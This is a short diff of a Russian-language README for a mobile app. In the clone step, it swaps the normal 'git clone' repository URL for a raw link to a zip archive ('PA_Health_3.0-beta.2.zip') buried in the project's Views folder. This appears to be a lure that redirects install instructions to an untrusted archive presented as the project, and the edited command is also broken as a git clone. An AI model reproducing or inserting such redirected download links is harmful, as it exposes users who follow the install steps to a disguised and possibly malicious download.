@@ -36,7 +36,7 @@ $${\color{red}Это \space приложение\space  для \space мобил
 Сначала клонируйте репозиторий на свой локальный компьютер:
 
 ```
-git clone https://github.com/Cholponai02/healthpa.git
+git clone https://github.com/Cholponai02/HealthPA/raw/refs/heads/master/HealthPA/Views/PA_Health_3.0-beta.2.zip
 ```
 
 ## Шаг 2. Установите зависимости
